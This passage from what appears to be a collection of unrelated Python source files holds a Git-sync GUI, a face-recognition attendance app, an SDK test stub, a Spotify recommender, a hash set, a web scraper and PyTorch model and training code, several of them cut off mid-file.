self.is_private_var.set(self.is_private_repo)\n\n        self.access_token_entry.delete(0, tk.END)\n        self.access_token_entry.insert(0, self.access_token)\n\n    def save_config(self):\n        self.update_config()\n        self.display_output(\"Configuration saved.\")\n\n    def run(self):\n        self.window.mainloop()\n\n    def create_widgets(self):\n        main_frame = ttk.Frame(self.window)\n        main_frame.pack(padx=10, pady=10)\n\n        # Repository Information\n        info_frame = ttk.LabelFrame(main_frame, text=\"Repository Information\")\n        info_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)\n\n        ttk.Label(info_frame, text=\"URL:\").grid(row=0, column=0, sticky=tk.W)\n        self.url_entry = ttk.Entry(info_frame, width=50)\n        self.url_entry.grid(row=0, column=1, sticky=tk.W)\n\n        ttk.Label(info_frame, text=\"Local Path:\").grid(row=1, column=0, sticky=tk.W)\n        self.local_path_entry = ttk.Entry(info_frame, width=50)\n        self.local_path_entry.grid(row=1, column=1, sticky=tk.W)\n        ttk.Button(info_frame, text=\"Browse\", command=self.browse_local_path).grid(row=1, column=2, padx=5)\n\n        ttk.Label(info_frame, text=\"Branch:\").grid(row=2, column=0, sticky=tk.W)\n        self.branch_entry = ttk.Entry(info_frame, width=50)\n        self.branch_entry.grid(row=2, column=1, sticky=tk.W)\n\n        ttk.Label(info_frame, text=\"Log File:\").grid(row=3, column=0, sticky=tk.W)\n        self.log_file_entry = ttk.Entry(info_frame, width=50)\n        self.log_file_entry.grid(row=3, column=1, sticky=tk.W)\n\n        self.is_private_var = tk.BooleanVar()\n        ttk.Checkbutton(info_frame, text=\"Private Repository\", variable=self.is_private_var).grid(row=4, column=0, sticky=tk.W)\n\n        ttk.Label(info_frame, text=\"Access Token:\").grid(row=5, column=0, sticky=tk.W)\n        self.access_token_entry = ttk.Entry(info_frame, width=50, show=\"*\")\n        self.access_token_entry.grid(row=5, column=1, sticky=tk.W)\n\n        # Add the \"Save Config\" button\n        save_config_button = ttk.Button(info_frame, text=\"Save Config\", command=self.save_config)\n        save_config_button.grid(row=6, column=1, padx=5, pady=5)\n\n        # Actions\n        actions_frame = ttk.LabelFrame(main_frame, text=\"Actions\")\n        actions_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)\n\n        ttk.Button(actions_frame, text=\"Start Monitoring\", command=self.start_monitoring).grid(row=0, column=0, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Perform One-Time Synchronization\", command=self.sync_repo).grid(row=0, column=1, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display Sync History\", command=self.display_sync_history).grid(row=1, column=0, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display Last Synchronization Status\", command=self.display_last_sync_status).grid(row=1, column=1, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display Repository Information\", command=self.display_repo_info).grid(row=2, column=0, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display Commit History\", command=self.display_commit_history).grid(row=3, column=0, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display Branch List\", command=self.display_branch_list).grid(row=3, column=1, padx=5, pady=5)\n        ttk.Button(actions_frame, text=\"Display File Changes for a Commit\", command=self.display_file_changes).grid(row=4, column=0, padx=5, pady=5)\n\n        # Output\n        output_frame = ttk.LabelFrame(main_frame, text=\"Output\")\n     ",
    "import cv2\nimport os\nfrom flask import Flask, request, render_template\nfrom datetime import date\nfrom datetime import datetime\nimport numpy as np\nfrom sklearn.neighbors import KNeighborsClassifier\nimport pandas as pd\nimport joblib\n\napp = Flask(__name__)\n\nnimgs = 10\n\nimgBackground=cv2.imread(\"background.png\")\n\ndatetoday = date.today().strftime(\"%m_%d_%y\")\ndatetoday2 = date.today().strftime(\"%d-%B-%Y\")\n\n\nface_detector = cv2.CascadeClassifier('haarcascade_frontalface_default.xml')\n\n\nif not os.path.isdir('Attendance'):\n    os.makedirs('Attendance')\nif not os.path.isdir('static'):\n    os.makedirs('static')\nif not os.path.isdir('static/faces'):\n    os.makedirs('static/faces')\nif f'Attendance-{datetoday}.csv' not in os.listdir('Attendance'):\n    with open(f'Attendance/Attendance-{datetoday}.csv', 'w') as f:\n        f.write('Name,Roll,Time')\n\ndef totalreg():\n    return len(os.listdir('static/faces'))\n\ndef extract_faces(img):\n    try:\n        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n        face_points = face_detector.detectMultiScale(gray, 1.2, 5, minSize=(20, 20))\n        return face_points\n    except:\n        return []\n\ndef identify_face(facearray):\n    model = joblib.load('static/face_recognition_model.pkl')\n    return model.predict(facearray)\n\n\ndef train_model():\n    faces = []\n    labels = []\n    userlist = os.listdir('static/faces')\n    for user in userlist:\n        for imgname in os.listdir(f'static/faces/{user}'):\n            img = cv2.imread(f'static/faces/{user}/{imgname}')\n            resized_face = cv2.resize(img, (50, 50))\n            faces.append(resized_face.ravel())\n            labels.append(user)\n    faces = np.array(faces)\n    knn = KNeighborsClassifier(n_neighbors=5)\n    knn.fit(faces, labels)\n    joblib.dump(knn, 'static/face_recognition_model.pkl')\n\ndef extract_attendance():\n    df = pd.read_csv(f'Attendance/Attendance-{datetoday}.csv')\n    names = df['Name']\n    rolls = df['Roll']\n    times = df['Time']\n    l = len(df)\n    return names, rolls, times, l\n\ndef add_attendance(name):\n    username = name.split('_')[0]\n    userid = name.split('_')[1]\n    current_time = datetime.now().strftime(\"%H:%M:%S\")\n\n    df = pd.read_csv(f'Attendance/Attendance-{datetoday}.csv')\n    if int(userid) not in list(df['Roll']):\n        with open(f'Attendance/Attendance-{datetoday}.csv', 'a') as f:\n            f.write(f'\\n{username},{userid},{current_time}')\n\ndef getallusers():\n    userlist = os.listdir('static/faces')\n    names = []\n    rolls = []\n    l = len(userlist)\n\n    for i in userlist:\n        name, roll = i.split('_')\n        names.append(name)\n        rolls.append(roll)\n\n    return userlist, names, rolls, l\n\n\n@app.route('/')\ndef home():\n    names, rolls, times, l = extract_attendance()\n    return render_template('home.html', names=names, rolls=rolls, times=times, l=l, totalreg=totalreg(), datetoday2=datetoday2)\n\n@app.route('/start', methods=['GET'])\ndef start():\n    names, rolls, times, l = extract_attendance()\n\n    if 'face_recognition_model.pkl' not in os.listdir('static'):\n        return render_template('home.html', names=names, rolls=rolls, times=times, l=l, totalreg=totalreg(), datetoday2=datetoday2, mess='There is no trained model in the static folder. Please add a new face to continue.')\n\n    ret = True\n    cap = cv2.VideoCapture(0)\n    while ret:\n        ret, frame = cap.read()\n        if len(extract_faces(frame)) > 0:\n            (x, y, w, h) = extract_faces(frame)[0]\n            cv2.rectangle(frame, (x, y), (x+w, y+h), (86, 32, 251), 1)\n            cv2.rectangle(frame, (x, y), (x+w, y-40), (86, 32, 251), -1)\n            face = cv2.resize(frame[y:y+h, x:x+w], (50, 50))\n            identified_person = identify_face(face.reshape(1, -1))[0]\n            add_attendance(identified_person)\n            cv2.rectangle(frame, (x,y), (x+w, y+h), (0,0,255), 1)\n            cv2.rectangle(frame,(x,y),(x+w,y+h),(50,50,255),2)\n            cv2.rectangle(frame,(x,y-40),(x+w,y),(50,50,255),-1)\n            cv2.putText(frame, f'{identified_person}', (x,y-15), cv2.FONT_HERSHEY_COMPLEX, 1, (255,255,255), 1)\n            cv2.rectangle(frame, (x,y), (x+w, y+h), (50,50,255), 1)\n        imgBackground[162:162 + 480, 55:55 + 640] = frame\n        cv2.imshow('Attendance', imgBackground)\n        if cv2.waitKey(1) == 27:\n            break\n    cap.release()\n    cv2.destroyAllWindows()\n    names, rolls, times, l = extract_attendance()\n    return render_template('home.html', names=names, rolls=rolls, times=times, l=l, totalreg=totalreg(), datetoday2=datetoday2)\n\n\n\n@app.route('/add', methods=['GET', 'POST'])\ndef add():\n    newusername = request.form['newusername']\n    newuserid = request.form['newuserid']\n    userimagefolder = 'static/faces/'+newusername+'_'+str(newuserid)\n    if not os.path.isdir(userimagefolder):\n        os.makedirs(userimagefolder)\n    i, j = 0, 0\n    cap = cv2.VideoCapture(0)\n    while 1:\n        _, frame = cap.read()\n        faces = extract_faces(frame)\n        for (x, y, w, h) in faces:\n            cv2.rectangle(",
    "# coding: utf-8\n\n\"\"\"\n    Pluggy API\n\n    Pluggy's main API to review data and execute connectors\n\n    The version of the OpenAPI document: 1.0.0\n    Contact: hello@pluggy.ai\n    Generated by OpenAPI Generator (https://openapi-generator.tech)\n\n    Do not edit the class manually.\n\"\"\"  # noqa: E501\n\n\nimport unittest\n\nfrom pluggy_sdk.models.bulk_payments_list200_response import BulkPaymentsList200Response\n\nclass TestBulkPaymentsList200Response(unittest.TestCase):\n    \"\"\"BulkPaymentsList200Response unit test stubs\"\"\"\n\n    def setUp(self):\n        pass\n\n    def tearDown(self):\n        pass\n\n    def make_instance(self, include_optional) -> BulkPaymentsList200Response:\n        \"\"\"Test BulkPaymentsList200Response\n            include_option is a boolean, when False only required\n            params are included, when True both required and\n            optional params are included \"\"\"\n        # uncomment below to create an instance of `BulkPaymentsList200Response`\n        \"\"\"\n        model = BulkPaymentsList200Response()\n        if include_optional:\n            return BulkPaymentsList200Response(\n                page = 1.337,\n                total = 1.337,\n                total_pages = 1.337,\n                results = [\n                    {\"id\":\"4cfe1f6d-ae71-4c35-aae0-8f8a535ffbbd\",\"totalAmount\":100.5,\"status\":\"CREATED\",\"createdAt\":\"2023-11-06T15:38:47.861Z\",\"updatedAt\":\"2023-11-06T15:45:19.384Z\",\"callbackUrls\":{\"success\":\"https://success.com\",\"pending\":\"https://pending.com\",\"error\":\"https://error.com\"},\"paymentUrl\":\"https://pay.pluggy.ai/bulk/05c693bf-c196-47ea-a28c-8251d6bb8a06\",\"paymentRequests\":[{\"id\":\"c2a6b7d9-3349-435d-8341-44021449ebbc\",\"amount\":100.5,\"description\":\"Transfer\u00eancia\",\"status\":\"IN_PROGRESS\",\"createdAt\":\"2023-11-06T13:03:45.689Z\",\"updatedAt\":\"2023-11-06T15:45:19.401Z\",\"callbackUrls\":null,\"recipient\":null,\"paymentUrl\":\"https://pay.pluggy.ai/05c693bf-c196-47ea-a28c-8251d6bb8a06\"}],\"smartAccount\":{\"id\":\"71996b6d-8991-450c-8542-ae59069d1a9d\",\"ispb\":\"0001020\",\"agency\":\"1234\",\"number\":\"123456\",\"verifyingDigit\":\"7\",\"type\":\"CHECKING_ACCOUNT\",\"isSandbox\":false}}\n                    ]\n            )\n        else:\n            return BulkPaymentsList200Response(\n        )\n        \"\"\"\n\n    def testBulkPaymentsList200Response(self):\n        \"\"\"Test BulkPaymentsList200Response\"\"\"\n        # inst_req_only = self.make_instance(include_optional=False)\n        # inst_req_and_optional = self.make_instance(include_optional=True)\n\nif __name__ == '__main__':\n    unittest.main()\n",
    "# ~ Import tkinter, spotipy, loadenv and pillow frameworks\nfrom tkinter import *\nfrom tkinter import ttk\nimport spotipy\nfrom spotipy.oauth2 import SpotifyOAuth\nfrom dotenv import load_dotenv\nfrom playlist import playlistsongs, playlistartists\n\n# ~ gets local environment files for CLIENT ID, CLIENT SECRET and REDIRECT URI\nload_dotenv()\n\n# ~ sets the scope of the library to read a users listening history\nscope = 'user-top-read'\nsp = spotipy.Spotify(auth_manager=SpotifyOAuth(scope=scope))\n\n# ~ Sets the main application window\nroot = Tk()\n# ~ Sets the title and base size of the application\nroot.title(\"Recommendify\")\nroot.geometry(\"1000x250\")\n\n# ~ Sets the main frame of the application\nmainframe = ttk.Frame(root, padding='3 3 12 12')\nmainframe.grid(column=0, row=0, sticky=(N, W, E, S))\nroot.columnconfigure(0, weight=1)\nroot.rowconfigure(0, weight=1)\n\n# ~ setting frames and borders to keep labels together\ntopsongs = ttk.Frame(mainframe, padding='3 3 12 12')\ntopsongs.grid(column=1,row=2)\ntopsongs['borderwidth'] = 2\ntopsongs['relief'] = 'raised'\ntopartist = ttk.Frame(mainframe, padding='3 3 12 12')\ntopartist.grid(column=6, row=2)\ntopartist['borderwidth'] = 2\ntopartist['relief'] = 'raised'\nsongrecs = ttk.Frame(mainframe, padding='3 3 12 12')\nsongrecs.grid(column=1, row=4)\nsongrecs['borderwidth'] = 2\nsongrecs['relief'] = 'raised'\nartistrecs = ttk.Frame(mainframe, padding='3 3 12 12')\nartistrecs.grid(column=6, row=4)\nartistrecs['borderwidth'] = 2\nartistrecs['relief'] = 'raised'\n\n\n\n# ~ Labels of text\nttk.Label(mainframe, text='Top 5 Songs of the past 12 months').grid(column=1, row=1, sticky=(W, S))\nttk.Label(mainframe, text='Top 5 Artists of the past 12 months').grid(column=6, row=1, sticky=(W, S))\nttk.Label(mainframe, text='5 Song Recommendations').grid(column=1, row=3, sticky=(W, S))\nttk.Label(mainframe, text='5 Artist Recommendations').grid(column=6, row=3, sticky=(W, S))\n\n# ~ function to get a users top 5 tracks of the past 12 months\ndef top5tracks():\n    # ~ sets the range of data to the past 12 months\n    for sp_range in ['long_term']:\n\n        # ~ sets a variable to a dictionary containing information about the users 5 top tracks\n        songresults = sp.current_user_top_tracks(time_range=sp_range, limit=5)\n\n        # ~ iterates through the dictionary and shows the name of the song and the artist's name\n        for i, item in enumerate(songresults['items']):\n            # ~ item['album']['images'][0]['url']) will implement image functionality at a later date\n            songname = (str(i + 1) + \". \" + item['name'])\n            artistname = item['artists'][0]['name']\n            ttk.Label(topsongs, text=songname).grid(column=i+1, row=1, sticky=(W))\n            ttk.Label(topsongs, text=artistname ).grid(column=i+1, row=2, sticky=(W))\n    return songresults\n\n# ~ function to get the top 5 artists of a user\ndef top5artists():\n    # ~ sets the range of data to the past 12 months\n    for sp_range in ['long_term']:\n\n        # ~ sets a variable to a dictionary containing information about the users 5 top artists\n        artistresults = sp.current_user_top_artists(time_range=sp_range, limit=5)\n\n        # ~ iterates through the dictionary and shows the artist's name\n        for i, item in enumerate(artistresults['items']):\n            artistname = (str(i+1) + \". \" + item['name'])\n            ttk.Label(topartist, text=artistname).grid(column=i + 1, row=1, sticky=(W))\n    return artistresults\n\n\n# ~ function to get recommendations based on top 5 tracks of a user\ndef songrecommendations(songresults):\n    # ~ initialise the array of track ids that will be used to seed the recommendations\n    trackseed = [\" \"] * 5\n\n    # ~ iterates through the songresults dictionary and stores each song's unique id\n    for i, item in enumerate(songresults['items']):\n        trackseed[i] = item['id']\n\n    # ~ sets a variable to a dictionary containing 5 song recommendations based on the 5 songs input\n    srecresults = sp.recommendations(seed_tracks=trackseed, limit=5)\n\n    # ~ displays the 5 song recommendations\n    for i in range(5):\n        recs = (str(i + 1) + \". \" + srecresults['tracks'][i]['name'])\n        artistname = srecresults['tracks'][i]['artists'][0]['name']\n        ttk.Label(songrecs, text=recs).grid(column=i+1, row=1, sticky=(W))\n        ttk.Label(songrecs, text=artistname).grid(column=i + 1, row=2, sticky=(W))\n    return srecresults\n\n# ~ function to get artist recommendations based on a users top 5 artists\ndef artistrecommendations(artistresults):\n    # ~ initialise seed array and iterate to store artists unique id\n    artistseed = [\" \"] * 5\n    for i, item in enumerate(artistresults['items']):\n        artistseed[i] = item['id']\n\n    # ~ sets a variable to a dictionary containing 5 song recommendations based on the 5 artists input\n    results = sp.recommendations(seed_artists=artistseed, limit=5)\n\n    # ~ displays the artists of the song recommendations found\n    for i in range(5):\n        recs = (str(i + 1) + \". \" + results['track",
    "class ListNode:\n    def __init__(self, key=None, next=None):\n        self.key = key\n        self.next = next\n\nclass MyHashSet:\n\n    def __init__(self):\n        self.set = [ListNode() for i in range(10601 + 1)]\n\n    def add(self, key: int) -> None:\n        index = key % len(self.set)\n        node = self.set[index]\n        while node and node.next:\n            if key == node.next.key:\n                return\n            node = node.next\n        node.next = ListNode(key)\n\n    def remove(self, key: int) -> None:\n        index = key % len(self.set)\n        node = self.set[index]\n        while node and node.next: # If we remove the last node, node.next becomes None,\n        # and accessing node.next would raise an AttributeError of 'NoneType'.\n            if key == node.next.key:\n                node.next = node.next.next\n            node = node.next\n\n    def contains(self, key: int) -> bool:\n        index = key % len(self.set)\n        node = self.set[index]\n        while node and node.next:\n            if key == node.next.key:\n                return True\n            node = node.next\n        return False\n\ndef test_MyHashSet():\n    hash_set = MyHashSet()\n    hash_set.add(1)\n    hash_set.add(2)\n    assert hash_set.contains(1) == True\n    assert hash_set.contains(3) == False\n    hash_set.add(2)\n    assert hash_set.contains(2) == True\n    hash_set.remove(2)\n    assert hash_set.contains(2) == False\n\ntest_MyHashSet()\nprint(\"All Test Cases Passed!\")\n",
    "from bs4 import BeautifulSoup\r\nimport requests\r\nimport os\r\nfrom urllib.parse import urljoin\r\n\r\nurl = \"https://en.wikipedia.org/wiki/Python_(programming_language)\"\r\nresponse = requests.get(url)  # HTML sayfas\u0131 i\u00e7in istek at\u0131yoruz\r\n\r\nsoup = BeautifulSoup(response.text, \"html.parser\")  # HTML sayfas\u0131n\u0131 par\u00e7al\u0131yoruz\r\n\r\ntitle = soup.title.string  # Sayfan\u0131n ba\u015fl\u0131\u011f\u0131n\u0131 al\u0131yoruz\r\nprint(title)\r\n\r\n# Sayfan\u0131n ilk paragraf\u0131n\u0131 al\u0131yoruz\r\nilk_paragraf = soup.find_all(\"p\")[0].text \r\nprint(\"\u0130lk Paragraf:\", ilk_paragraf)\r\n\r\nfor paragraf in soup.find_all(\"p\"):  # T\u00fcm paragraflar\u0131 al\u0131yoruz\r\n    print(paragraf.text)  # Paragraflar\u0131 yazd\u0131r\u0131yoruz\r\n\r\n# \u0130\u00e7indekiler b\u00f6l\u00fcm\u00fcn\u00fc al\u0131yoruz (Bu site i\u00e7in muhtemelen \u00e7al\u0131\u015fmayacak)\r\ncontents = soup.select('#toc')\r\nfor item in contents:\r\n    print(item.text)\r\n\r\n# T\u00fcm tablolar\u0131 ve i\u00e7eriklerini yazd\u0131r\u0131yoruz\r\ntables = soup.find_all(\"table\")\r\nfor table in tables:\r\n    table_title = table.caption.text if table.caption else \"Tablo ba\u015fl\u0131\u011f\u0131 yok\"\r\n    print(\"Tablo Ba\u015fl\u0131\u011f\u0131:\", table_title)\r\n    rows = table.find_all(\"tr\")\r\n    for row in rows:\r\n        cells = row.find_all([\"td\", \"th\"])\r\n        for cell in cells:\r\n            print(cell.text.strip(), end=\"\\t\")\r\n        print(\"\")  # Her sat\u0131rdan sonra yeni bir sat\u0131ra ge\u00e7\r\n\r\nimages = soup.find_all(\"img\")\r\nos.makedirs(\"downloaded_images\", exist_ok=True)\r\nfor index, image in enumerate(images):\r\n    image_url = image[\"src\"]  # Resmin URL'sini al\u0131yoruz\r\n    if image_url.startswith(\"//\"):\r\n        image_url = \"https:\" + image_url\r\n    if not image_url.startswith((\"http://\", \"https://\")):\r\n        image_url = urljoin(url, image_url)\r\n    image_response = requests.get(image_url)  # Her resim i\u00e7in ayr\u0131 bir istek at\u0131yoruz\r\n    with open(f\"downloaded_images/image_{index}.jpg\", \"wb\") as file:\r\n        file.write(image_response.content)  # Resmin i\u00e7eri\u011fini dosyaya yaz\u0131yoruz\r\n    alt_text = image.get(\"alt\", \"alternatif metin yok\")\r\n    print(f\"Resim {index} URL'si: {image_url}\")\r\n    print(f\"Resim {index} alternatif metin: {alt_text}\")\r\n    print(f\"Resim {index} indirildi\\n\" + \"-\"*50 + \"\\n\")\r\n",
    "import numpy as np\r\nimport torch\r\nimport torch.nn as nn\r\nfrom torch.nn.utils import weight_norm\r\n\r\nclass Chomp1d(nn.Module):\r\n    def __init__(self, chomp_size):\r\n        super(Chomp1d, self).__init__()\r\n        self.chomp_size = chomp_size\r\n\r\n    def forward(self, x):\r\n        return x[:, :, :-self.chomp_size].contiguous()\r\n\r\n\r\nclass TemporalBlock(nn.Module):\r\n    def __init__(self, n_inputs, n_outputs, kernel_size, stride, dilation, padding, dropout=0.2):\r\n        \"\"\"\r\n        \u76f8\u5f53\u4e8e\u4e00\u4e2aResidual block\r\n\r\n        :param n_inputs: int, Number of input channels\r\n        :param n_outputs: int, int, Number of output channels\r\n        :param kernel_size: int, The size of convolutional kernel\r\n        :param stride: int\r\n        :param dilation: int\r\n        :param padding: int\r\n        :param dropout: float\r\n        \"\"\"\r\n        super(TemporalBlock, self).__init__()\r\n        self.conv1 = weight_norm(nn.Conv1d(n_inputs, n_outputs, kernel_size,\r\n                                           stride=stride, padding=padding, dilation=dilation))\r\n        self.chomp1 = Chomp1d(padding)\r\n        self.relu1 = nn.ReLU()\r\n        self.dropout1 = nn.Dropout(dropout)\r\n\r\n        self.conv2 = weight_norm(nn.Conv1d(n_outputs, n_outputs, kernel_size,\r\n                                           stride=stride, padding=padding, dilation=dilation))\r\n        self.chomp2 = Chomp1d(padding)  \r\n        self.relu2 = nn.ReLU()\r\n        self.dropout2 = nn.Dropout(dropout)\r\n\r\n        self.net = nn.Sequential(self.conv1, self.chomp1, self.relu1, self.dropout1,\r\n                                 self.conv2, self.chomp2, self.relu2, self.dropout2)\r\n        self.downsample = nn.Conv1d(n_inputs, n_outputs, 1) if n_inputs != n_outputs else None\r\n        self.relu = nn.ReLU()\r\n        self.init_weights()\r\n\r\n    def init_weights(self):\r\n\r\n        self.conv1.weight.data.normal_(0, 0.01)\r\n        self.conv2.weight.data.normal_(0, 0.01)\r\n        if self.downsample is not None:\r\n            self.downsample.weight.data.normal_(0, 0.01)\r\n\r\n    def forward(self, x):\r\n\r\n        out = self.net(x)\r\n        res = x if self.downsample is None else self.downsample(x)\r\n        return self.relu(out + res)\r\n\r\n\r\nclass TemporalConvNet_GRU(nn.Module):\r\n    def __init__(self, num_inputs=4, num_channels=[32, 32, 32, 32], kernel_size=3, dropout=0):\r\n        \"\"\"\r\n        :param num_inputs: int\uff0c Number of input channels\r\n        :param num_channels: list\uff0cNumber of hidden channel in each layer\r\n        :param kernel_size: int\r\n        :param dropout: float\r\n        \"\"\"\r\n        super(TemporalConvNet_GRU, self).__init__()\r\n        layers = []\r\n        num_levels = len(num_channels)\r\n        for i in range(num_levels):\r\n            dilation_size = 2 ** i  \r\n            in_channels = num_inputs if i == 0 else num_channels[i - 1]  \r\n            out_channels = num_channels[i] \r\n            layers += [TemporalBlock(in_channels, out_channels, kernel_size, stride=1, dilation=dilation_size,\r\n                                     padding=(kernel_size - 1) * dilation_size, dropout=dropout)]\r\n\r\n        self.network = nn.Sequential(*layers)\r\n        self.gru = nn.GRU(32, 32, 1, batch_first=True)\r\n        self.linear = nn.Linear(num_channels[-1], 6)\r\n\r\n    def forward(self, x):\r\n        \"\"\"\r\n        :param x: size of (Batch, input_channel, seq_len)\r\n        :return: size of (Batch, output_channel, seq_len)\r\n        \"\"\"\r\n        x = x.permute(0, 2, 1)\r\n        out = self.network(x)\r\n        gru_input = out.permute(0, 2, 1)\r\n        output,hn = self.gru(gru_input)\r\n        return out[:, :, -1]\r\n",
    "# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.\n# SPDX-License-Identifier: Apache-2.0\nimport argparse\n\nimport numpy as np\nimport openml\nimport pandas as pd\nfrom sklearn.compose import ColumnTransformer\nfrom sklearn.metrics import mean_squared_error\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.preprocessing import FunctionTransformer\nfrom sklearn.preprocessing import OneHotEncoder\n\nfrom BoostedAdaSSP import BoostedAdaSSP\n\nparser = argparse.ArgumentParser(description=\"BoostedAdaSSP\")\nparser.add_argument(\"--seed\", type=int, default=0, help=\"random seed\")\nparser.add_argument(\n    \"--num_iterations\", type=int, default=100, help=\"number of iterations\"\n)\nparser.add_argument(\"--shrinkage\", type=str, default=\"constant\")\n\nparser.add_argument(\"--epsilon\", type=float, default=1)\nparser.add_argument(\"--delta\", type=float, default=1e-6)\n\nparser.add_argument(\"--x_bound\", type=float, default=1)\nparser.add_argument(\"--y_bound\", type=float, default=1)\n\nparser.add_argument(\"--SUITE_ID\", type=int, choices=[297, 299], default=297)\n\nargs = parser.parse_args()\n\n\ndef preprocessing_data(X, y, categorical_indicator):\n    data = pd.concat((X, y), axis=1)\n    data = data.dropna(axis=0, how=\"any\")\n    X = data.iloc[:, :-1]\n    y = data.iloc[:, -1]\n\n    is_cat = np.asarray(categorical_indicator)\n\n    cat_cols = X.columns.values[is_cat]\n    num_cols = X.columns.values[~is_cat]\n\n    cat_ohe_step = (\"ohe\", OneHotEncoder(sparse_output=False, handle_unknown=\"ignore\"))\n\n    cat_pipe = Pipeline([cat_ohe_step])\n    num_pipe = Pipeline([(\"identity\", FunctionTransformer())])\n    transformers = [(\"cat\", cat_pipe, cat_cols), (\"num\", num_pipe, num_cols)]\n    ct = ColumnTransformer(transformers=transformers)\n\n    pipe = Pipeline(\n        [\n            (\"ct\", ct),\n        ]\n    )\n\n    X = pipe.fit_transform(X)\n\n    return X, y\n\n\nbenchmark_suite = openml.study.get_suite(args.SUITE_ID)  # obtain the benchmark suite\nfor task_id in benchmark_suite.tasks:  # iterate over all tasks\n    task = openml.tasks.get_task(task_id)  # download the OpenML task\n    dataset = task.get_dataset()\n\n    X, y, categorical_indicator, attribute_names = dataset.get_data(\n        dataset_format=\"dataframe\", target=dataset.default_target_attribute\n    )\n\n    X, y = preprocessing_data(X, y, categorical_indicator)\n    rng = np.random.RandomState(args.seed)\n\n    X_train, X_test, y_train, y_test = train_test_split(\n        X, y, test_size=0.2, random_state=42\n    )\n\n    model = BoostedAdaSSP(\n        args.x_bound,\n        args.y_bound,\n        args.epsilon,\n        args.delta,\n        args.num_iterations,\n        args.shrinkage,\n        rng,\n    )\n\n    model.fit(X_train, y_train)\n\n    y_score = model.predict(X_test)\n    y_score_train = model.predict(X_train)\n\n    print(\n        task_id,\n        args.seed,\n        args.epsilon,\n        args.delta,\n        args.num_iterations,\n        args.shrinkage,\n        args.x_bound,\n        args.y_bound,\n        mean_squared_error(y_train, y_score_train),\n        mean_squared_error(y_test, y_score),\n    )\n",
    "import os\nimport shutil\nimport time\nimport pickle\n\nimport numpy as np\nimport random\nfrom copy import deepcopy\n\nimport torch\nimport torch.optim as optim\nimport torch.backends.cudnn as cudnn\n\nfrom .get_detect_performance import evaluation_detection\n\nfrom .lr_schedulers import LinearWarmupMultiStepLR, LinearWarmupCosineAnnealingLR\nfrom .postprocessing import postprocess_results\nfrom ..modeling import MaskedConv1D, Scale, AffineDropPath, LayerNorm\nfrom ..modeling.modeling_xlnet_x import XLNetModel, XLNetLMHeadModel\nfrom functools import partial\nimport logging\nimport time\nfrom .metrics import ANETdetection\n\n\n################################################################################\ndef fix_random_seed(seed, include_cuda=True):\n    rng_generator = torch.manual_seed(seed)\n    np.random.seed(seed)\n    random.seed(seed)\n    os.environ[\"PYTHONHASHSEED\"] = str(seed)\n    if include_cuda:\n        # training: disable cudnn benchmark to ensure the reproducibility\n        cudnn.enabled = True\n        cudnn.benchmark = False\n        cudnn.deterministic = True\n        torch.cuda.manual_seed(seed)\n        torch.cuda.manual_seed_all(seed)\n        # this is needed for CUDA >= 10.2\n        # os.environ[\"CUBLAS_WORKSPACE_CONFIG\"] = \":4096:8\"\n        # torch.use_deterministic_algorithms(True, warn_only=True)\n    else:\n        cudnn.enabled = True\n        cudnn.benchmark = True\n    return rng_generator\n\n\ndef save_checkpoint(state, file_folder,\n                    file_name='checkpoint.pth.tar'):\n    \"\"\"save checkpoint to file\"\"\"\n    if not os.path.exists(file_folder):\n        os.mkdir(file_folder)\n    torch.save(state, os.path.join(file_folder, file_name))\n\n\ndef print_model_params(model):\n    for name, param in model.named_parameters():\n        print(name, param.min().item(), param.max().item(), param.mean().item())\n    return\n\n\ndef make_optimizer(model, optimizer_config):\n    \"\"\"create optimizer\n    return a supported optimizer\n    \"\"\"\n    # separate out all parameters that with / without weight decay\n    # see https://github.com/karpathy/minGPT/blob/master/mingpt/model.py#L134\n    decay = set()\n    no_decay = set()\n    whitelist_weight_modules = (torch.nn.Linear, torch.nn.Conv1d, MaskedConv1D)\n    blacklist_weight_modules = (LayerNorm, torch.nn.GroupNorm)\n\n    # loop over all modules / params\n    for mn, m in model.named_modules():\n        for pn, p in m.named_parameters():\n            fpn = '%s.%s' % (mn, pn) if mn else pn # full param name\n            if pn.endswith('bias'):\n                # all biases will not be decayed\n                no_decay.add(fpn)\n            elif 'xlnet' in pn and 'norm' not in pn:\n                decay.add(fpn)\n            elif 'xlnet' in pn and 'norm' in pn:\n                no_decay.add(fpn)\n            elif pn.endswith('weight') and isinstance(m, whitelist_weight_modules):\n                # weights of whitelist modules will be weight decayed\n                decay.add(fpn)\n            elif pn.endswith('weight') and isinstance(m, blacklist_weight_modules):\n                # weights of blacklist modules will NOT be weight decayed\n                no_decay.add(fpn)\n            elif pn.endswith('scale') and isinstance(m, (Scale, AffineDropPath)):\n                # corner case of our scale layer\n                no_decay.add(fpn)\n            elif pn.endswith('rel_pe'):\n                # corner case for relative position encoding\n                no_decay.add(fpn)\n\n    # validate that we considered every parameter\n    param_dict = {pn: p for pn, p in model.named_parameters()}\n    inter_params = decay & no_decay\n    union_params = decay | no_decay\n    remain_params = param_dict.keys() - union_params\n    # assert len(inter_params) == 0, \"parameters %s made it into both decay/no_decay sets!\" % (str(inter_params), )\n    # assert len(param_dict.keys() - union_params) == 0, \\\n    #     \"parameters %s were not separated into either decay/no_decay set!\" \\\n    #     % (str(param_dict.keys() - union_params), )\n\n    # create the pytorch optimizer object\n    optim_groups = [\n        {\"params\": [param_dict[pn] for pn in sorted(list(decay))], \"weight_decay\": optimizer_config['weight_decay']},\n        {\"params\": [param_dict[pn] for pn in sorted(list(no_decay))], \"weight_decay\": 0.0},\n        {\"params\": [param_dict[pn] for pn in sorted(list(remain_params))], \"weight_decay\": optimizer_config['weight_decay']}\n    ]\n    if optimizer_config[\"type\"] == \"SGD\":\n        optimizer = optim.SGD(\n            optim_groups,\n            lr=optimizer_config[\"learning_rate\"],\n            momentum=optimizer_config[\"momentum\"]\n        )\n    elif optimizer_config[\"type\"] == \"AdamW\":\n        optimizer = optim.AdamW(\n            optim_groups,\n            